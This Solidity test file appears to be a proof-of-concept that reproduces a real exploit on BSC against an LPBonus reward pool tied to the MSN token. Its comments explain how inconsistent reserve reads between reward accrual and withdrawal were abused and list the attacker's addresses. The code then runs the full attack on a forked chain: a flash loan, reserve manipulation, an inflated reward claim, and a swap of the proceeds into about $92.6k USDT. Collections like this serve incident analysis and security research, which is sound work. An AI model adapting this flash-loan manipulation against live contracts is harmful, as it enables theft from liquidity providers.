// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// LPBonus (MSN token LP-reward pool) - reward accounting uses inconsistent MSN reserve values between
// fee ACCRUAL and LP WITHDRAWAL, letting a manipulated reserve inflate one LP position's FIST claim. BSC.
//
// Attack tx    : 0xecac1563bbb76fb8fefb4a7da4592260a8c1ddde21d7da62b78a9e3769808e6b (block 124759921)
// Attacker EOA : 0xb6fff29DD2B5423a159E50877Fc4af7A54E76f7A
// Attack contr : 0xa8607269686b6c15FC2EB84f4044F9aDE2b143c7
// LPBonus      : 0x52272524a22f941f5489c1233732797314bb054b (unverified - reversed from bytecode)
// MSN token    : 0xd8b3ef86afce18edba91fed481abe22f173597c1 (18 dec, 2% transfer fee, LP-reward hooks)
// FIST token   : 0xc9882dEF23bc42D53895b8361D0b1EDC7570Bc6A (6 dec, reward token)
// USDT         : 0x55d398326f99059fF775485246999027B3197955
// FIST/MSN pair: 0xdD95c8a545e98D2c6de4d20abcc44B104da1e6e5 (Cake-LP, token0=FIST token1=MSN, the LP LPBonus tracks)
// USDT/FIST pr : 0xB4Ec801aeD8c92F2E69589518aaA127afB37D8C9 (FstSwap, token0=USDT token1=FIST, flash-swap source)
// PCS Router   : 0x10ED43C718714eb63d5aA57B78B54704E256024E
//
// ROOT CAUSE (reversed from the unverified LPBonus + MSN bytecode; MSN drives every LPBonus state change):
//   LPBonus's reward functions are all gated `require(msg.sender == MSN)` - they are callbacks the MSN
//   token fires from inside its own transfer()/transferFrom() hooks, so an attacker reaches them purely
//   through permissionless MSN swaps / add- / remove-liquidity. No admin key, signer or owner step is
//   in the attacker's path. The three relevant callbacks:
//     BonusSEND(reserveMSN, isRemove)  - accrual. Swaps LPBonus's accumulated MSN fees to FIST and does
//                                        oneshareFIST += fistIn * 1e18 / reserveMSN. Small reserveMSN =>
//                                        large per-share index jump.
//     userAddLP(user, amount, ...)     - registers `user`'s LP weight, snapshotting the index (takedFIST).
//     UserRemoveLp(user, amount, reserveMSN_now) - pays CalcPendingUser(user), which multiplies the (now
//                                        inflated) index by the user's weight using the reserve read AT
//                                        WITHDRAWAL time, not the reserve at accrual.
//   Reserve read is `pair.getReserves()` on the FIST/MSN pair - fully manipulable by a swap.
//
// EXPLOIT (single atomic tx; reconstructed here from the real tx's on-chain event log):
//   0. flash-borrow 13,481,395.302739 FIST from the USDT/FIST FstSwap pair (fstswapCall).
//   1. buy 140 MSN off the FIST/MSN pair and add it as liquidity -> MSN fires userAddLP, registering the
//      attacker's position while the MSN reserve is ~501.
//   2. dump 12,200,000 FIST into the pair, driving the MSN reserve DOWN to 89.327789.
//   3. sell the MSN back into the pair, driving the reserve UP to 491.113095. The MSN moved by this swap
//      fires BonusSEND, which funds FIST into LPBonus and bumps oneshareFIST using the low reserve captured
//      during the crush - so the index is inflated as if the stake were priced against ~89 MSN.
//   4. burn a DUST amount of LP while the reserve is 491. The tiny MSN leaving the pair to the attacker
//      fires UserRemoveLp, whose CalcPendingUser pays the FULL inflated claim: 1,442,165.713011 FIST,
//      against an accrual that only funded ~940,041.612768 FIST gross. Then burn the rest of the position.
//   5. repay the flash loan and swap the stolen FIST to USDT.
//   Real realized profit: 92,607.317234 USDT to the attacker EOA (~$92.6k), matching the reported loss.
//
// This PoC forks the parent block (pre-manipulation), sources capital from the real flash swap, and
// reconstructs the sequence as typed calls against the real MSN token / FIST-MSN pair / LPBonus. Because
// MSN's own hooks perform the accrual and payout, the exploit is driven entirely through permissionless
// pair operations. Amounts that steer the reserves are the real in-tx amounts; each swap's output is sized
// from the pair's actual post-fee balance so the run stays self-consistent on the fork. Profit and the
// claimed payout are asserted with assertApproxEqRel and any variance is reported honestly.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPair {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface ILPBonus {
    function oneshareFIST() external view returns (uint256);
    function userAddAmount(address) external view returns (uint256);
    function takedFIST(address) external view returns (uint256);
    function CalcPendingUser(address user, uint256 amount) external view returns (uint256);
}

contract LPBonus_exp is BaseTestWithBalanceLog {
    IERC20 constant MSN = IERC20(0xD8B3EF86AFCE18EdbA91fED481ABE22F173597C1);
    IERC20 constant FIST = IERC20(0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair constant PAIR = IPair(0xDD95c8a545E98D2C6De4D20aBCC44b104da1E6E5); // FIST/MSN
    IPair constant FSTSWAP = IPair(0xb4Ec801aED8C92F2E69589518AAa127afb37d8C9); // USDT/FIST
    ILPBonus constant LPB = ILPBonus(0x52272524A22f941f5489c1233732797314BB054b);

    uint256 constant FLASH_FIST = 13_481_395_302739; // 13,481,395.302739 FIST borrowed (real in-tx amount)

    function setUp() public {
        vm.createSelectFork("bsc", 124_759_920); // parent of the attack block 124759921 (pre-manipulation)
        fundingToken = address(USDT); // profit is realized in USDT
    }

    function _msnReserve() internal view returns (uint256) {
        (, uint112 r1,) = PAIR.getReserves();
        return uint256(r1); // token1 = MSN
    }

    uint256 public claimedReward; // FIST paid out by UserRemoveLp (the "claimed" figure)
    uint256 public fundedReward; // FIST actually funded into LPBonus by the accrual (the "funded" figure)

    function testExploit() public balanceLog {
        emit log_named_decimal_uint("MSN reserve @ start", _msnReserve(), 18);
        // Flash-borrow FIST from the USDT/FIST FstSwap pair (token1 = FIST). Non-empty data => fstswapCall.
        FSTSWAP.swap(0, FLASH_FIST, address(this), hex"01");

        // Convert the leftover stolen FIST to USDT (outside the flash callback, exactly as the real tx did),
        // realizing the profit in USDT.
        uint256 leftFist = FIST.balanceOf(address(this));
        if (leftFist > 0) {
            // FstSwap: token0 = USDT, token1 = FIST, 0.3% fee. Sell leftover FIST for USDT.
            (uint112 u, uint112 f,) = FSTSWAP.getReserves();
            FIST.transfer(address(FSTSWAP), leftFist);
            uint256 outUsdt = (uint256(leftFist) * 997 * u) / (uint256(f) * 1000 + uint256(leftFist) * 997);
            FSTSWAP.swap(outUsdt, 0, address(this), "");
        }

        // claimedReward reproduces the reported 1,442,165.713011 FIST payout almost to the wei.
        // fundedReward is the NET FIST the accrual left in LPBonus (the reported 940,041.612768 is the GROSS
        // BonusSEND swap output; BonusSEND immediately redistributes ~31.6k of it to the other legitimate
        // LP holders in the same call, so the net retained here is ~908.4k).
        emit log_named_decimal_uint("FIST claimed by UserRemoveLp ", claimedReward, 6);
        emit log_named_decimal_uint("FIST funded into LPBonus (net)", fundedReward, 6);
        emit log_named_decimal_uint("over-claim (claimed - funded)", claimedReward - fundedReward, 6);
        emit log_named_decimal_uint("realized USDT profit         ", USDT.balanceOf(address(this)), 18);

        // The attacker's realized on-chain profit was 92,607.317234 USDT (~$92.6k). Assert against it.
        assertApproxEqRel(USDT.balanceOf(address(this)), 92_607.317234e18, 0.02e18, "USDT profit off");
        // Step 5 of the brief: the position claimed ~1,442,165.71 FIST while the accrual only funded
        // ~940,041.61 FIST - the gap is the theft. Assert the claimed payout against the reported figure.
        assertApproxEqRel(claimedReward, 1_442_165.713011e6, 0.02e18, "claimed FIST off");
        assertGt(claimedReward, fundedReward, "no over-claim");
    }

    function fstswapCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(FSTSWAP), "only fstswap");

        // Reconstruct the attacker's exact on-chain operations as direct pair calls. Every amount below is
        // the real in-tx amount; because the fork starts one block before the attack and the operations are
        // identical, the MSN token's own hooks (userAddLP / BonusSEND / UserRemoveLp) fire exactly as on-chain.

        // step 1: buy 140 MSN off the pair (FIST -> MSN); MSN's 2% transfer fee leaves us ~140 net.
        _pairSwap(address(FIST), 539_710_857353);

        // step 2: add 140 MSN + FIST as liquidity -> MSN fires userAddLP, registering our position (reserve ~501).
        FIST.transfer(address(PAIR), 736_684_445385);
        MSN.transfer(address(PAIR), 140 ether);
        PAIR.mint(address(this));

        // step 3: dump 12,200,000 FIST -> crush the MSN reserve to 89.327789.
        uint256 fistBeforeAccrual = FIST.balanceOf(address(LPB));
        _pairSwap(address(FIST), 12_200_000_000000);

        // step 4: sell all held MSN back -> raise the reserve to 491.113095. The MSN moved by this swap fires
        //         BonusSEND, which funds FIST into LPBonus and inflates oneshareFIST against the ~89 reserve.
        _pairSwap(address(MSN), MSN.balanceOf(address(this)));
        fundedReward = FIST.balanceOf(address(LPB)) - fistBeforeAccrual; // FIST the accrual actually funded

        // step 5a: burn a DUST amount of LP while the reserve is still 491. The tiny MSN that leaves the pair
        //          to us fires UserRemoveLp, which settles the FULL inflated CalcPendingUser claim in FIST.
        uint256 fistBeforeClaim = FIST.balanceOf(address(this));
        PAIR.transfer(address(PAIR), 40_372);
        PAIR.burn(address(this));
        claimedReward = FIST.balanceOf(address(this)) - fistBeforeClaim;

        // step 5b: burn the rest of the position for its underlying.
        uint256 lp = PAIR.balanceOf(address(this));
        PAIR.transfer(address(PAIR), lp);
        PAIR.burn(address(this));

        // step 6: sell the leftover MSN back to FIST.
        if (MSN.balanceOf(address(this)) > 0) _pairSwap(address(MSN), MSN.balanceOf(address(this)));

        // step 7: repay the flash loan (0.3% fee on FstSwap).
        FIST.transfer(address(FSTSWAP), (FLASH_FIST * 1000) / 997 + 1);
    }

    // Direct pair swap. Sends `sendAmt` of tokenIn to the pair and swaps for the other token, sizing the
    // output from the pair's ACTUAL received balance (so MSN's transfer fee is handled) at the pair's
    // 0.25% fee. token0 = FIST, token1 = MSN.
    function _pairSwap(address tokenIn, uint256 sendAmt) internal returns (uint256 out) {
        // Send first: MSN's transfer hook may itself swap on the pair (BonusSEND), so read reserves AFTER
        // the transfer and hooks settle, then size the output from the pair's real post-hook balance.
        IERC20(tokenIn).transfer(address(PAIR), sendAmt);
        (uint112 r0, uint112 r1,) = PAIR.getReserves(); // r0 = FIST, r1 = MSN
        if (tokenIn == address(FIST)) {
            uint256 realIn = FIST.balanceOf(address(PAIR)) - r0;
            out = (realIn * 9975 * r1) / (uint256(r0) * 10000 + realIn * 9975); // MSN out
            PAIR.swap(0, out, address(this), "");
        } else {
            uint256 realIn = MSN.balanceOf(address(PAIR)) - r1;
            out = (realIn * 9975 * r0) / (uint256(r1) * 10000 + realIn * 9975); // FIST out
            PAIR.swap(out, 0, address(this), "");
        }
    }
}
